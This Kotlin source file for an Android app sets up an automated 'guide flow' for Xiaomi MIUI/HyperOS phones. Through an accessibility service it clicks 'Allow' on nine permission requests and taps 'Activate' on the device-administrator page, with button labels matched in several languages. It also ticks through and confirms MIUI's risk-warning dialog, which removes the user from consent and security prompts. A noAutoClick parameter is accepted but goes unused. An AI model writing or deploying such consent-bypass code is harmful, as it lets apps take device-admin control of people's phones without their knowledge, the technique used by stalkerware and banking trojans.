package com.zaka.screenagent.flow.miui

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.flow.VendorFlow
import com.zaka.screenagent.admin.MoyingAdminReceiver
import com.zaka.screenagent.flow.miui.MiuiNavigator
import com.zaka.screenagent.perm.PermissionActivity

/**
 * 小米（MIUI / HyperOS / Redmi / POCO）引导流程 —— 一个文件，两步。
 *
 *   start()
 *     ├ step1_权限()      申请 9 项权限 + 自动点「允许」
 *     └ step2_设备管理()  打开激活页 + 点「启用」+ 危险页（2s 勾选 / 10s 确定）
 *
 * 危险页处理统一封装在 passRiskDialog()。
 */
object MiuiFlow : VendorFlow {

    private const val TAG = "Flow(MIUI)"
    private val ui = Handler(Looper.getMainLooper())
    private lateinit var service: BoundaryAccessibilityService

    override fun start(service: BoundaryAccessibilityService, noAutoClick: Boolean) {
        this.service = service
        Log.d(TAG, "===== MIUI 引导开始 =====")
        // 关掉其它厂商的自动接力（小米只跑自己的两步）
        com.zaka.screenagent.admin.AdminActivator.chainToNotification = false
        PermissionActivity.chainToAdmin = false

        step1_权限()
    }

    // ─────────────────── 第一步：申请权限（自动点允许） ───────────────────

    private fun step1_权限() {
        Log.d(TAG, "step1: 自动申请权限 + 自动点「允许」")
        com.zaka.screenagent.flow.miui.MiuiPermission.run(service) { granted ->
            if (!granted) Log.w(TAG, "step1: 未拿全权限，继续走设备管理员")
            else Log.d(TAG, "step1: 权限已全部授予")
            step2_设备管理()
        }
    }

    // ─────────────────── 第二步：设备管理员 + 危险页 ───────────────────

    private fun step2_设备管理() {
        Log.d(TAG, "step2: 打开设备管理激活页")
        // 激活页只能由前台 Activity 拉起：用本文件里的 MiuiAdminActivity 当载体
        runCatching {
            service.startActivity(
                Intent(service, MiuiAdminActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "step2: 打开激活页失败 $it") }

        // 页面出来后点一次「启用此设备管理应用」
        ui.postDelayed({ Log.d(TAG, "step2: 点击「启用」= ${clickActivateOnce()}") }, 4_000L)

        // 等危险页 → 处理 → 结束
        var ticks = 0
        fun watch() {
            if (MiuiNavigator.onRiskDialog(service)) {
                passRiskDialog { finish("管理员=${MoyingAdminReceiver.isActive(service)}") }
                return
            }
            if (ticks++ > 40) {
                Log.w(TAG, "step2: 等危险页超时")
                finish("管理员=${MoyingAdminReceiver.isActive(service)}")
                return
            }
            ui.postDelayed({ watch() }, 1_500L)
        }
        ui.postDelayed({ watch() }, 6_000L)
    }

    /** 只在系统激活页（DeviceAdminAdd）里点，其它页面一律不动 */
    private fun clickActivateOnce(): Boolean {
        val root = service.rootInActiveWindow ?: return false
        if (root.packageName?.toString() != "com.android.settings") return false
        if (!root.className?.toString().orEmpty().contains("DeviceAdminAdd")) {
            Log.d(TAG, "step2: 当前不在激活页（${root.className}）")
            return false
        }
        for (t in ACTIVATE_TEXTS) {
            val n = findText(root, t, 0) ?: continue
            if (!n.isEnabled) continue
            if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            if (MiuiNavigator.tapByGesture(service, n)) return true
        }
        findId(root, "action_button", 0)?.let { n ->
            if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            if (MiuiNavigator.tapByGesture(service, n)) return true
        }
        return false
    }

    private val ACTIVATE_TEXTS = listOf(
        "启用此设备管理应用", "启用设备管理应用", "启用", "激活",
        "Activate this device admin app", "Activate", "Enable",
        "Activar esta aplicación de administración", "Activar",
        "Ativar este app de administração de dispositivo", "Ativar"
    )

    // ───────────────────── 危险页（统一封装） ─────────────────────

    private fun passRiskDialog(onDone: () -> Unit) {
        Log.d(TAG, "危险页: 2s 勾选「我已知晓」")
        MiuiNavigator.passRiskDialog(service) { ok ->
            Log.d(TAG, "危险页: 处理=$ok")
            onDone()
        }
    }

    // ───────────────────────── 结束 ─────────────────────────

    private fun finish(summary: String) {
        Log.d(TAG, "结束：$summary")
        Log.d(TAG, "===== MIUI 引导结束 =====")
    }

    // ───────────────────── 节点小工具 ─────────────────────

    private fun findId(n: AccessibilityNodeInfo?, suffix: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.viewIdResourceName.orEmpty().endsWith(suffix)) return n
        for (i in 0 until n.childCount) findId(n.getChild(i), suffix, d + 1)?.let { return it }
        return null
    }

    private fun findText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.text?.toString() == want) return n
        for (i in 0 until n.childCount) findText(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }
}

/**
 * 小米专属：设备管理员激活页载体（前台 Activity 才能拉起系统激活页）。
 * 放在同一个文件里，不单独建文件，也不碰通用的 PermissionActivity。
 */
class MiuiAdminActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)                 // 必须第一句
        Log.d("MiuiAdminActivity", "打开设备管理激活页")
        runCatching {
            startActivityForResult(
                MoyingAdminReceiver.activationIntent(this, newTask = false), 2001
            )
        }.onFailure { Log.w("MiuiAdminActivity", "打开激活页失败: $it") }
        // 激活页已经盖在上面了，这个空壳 1.5 秒后自己退出
        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 1_500L)
    }
}
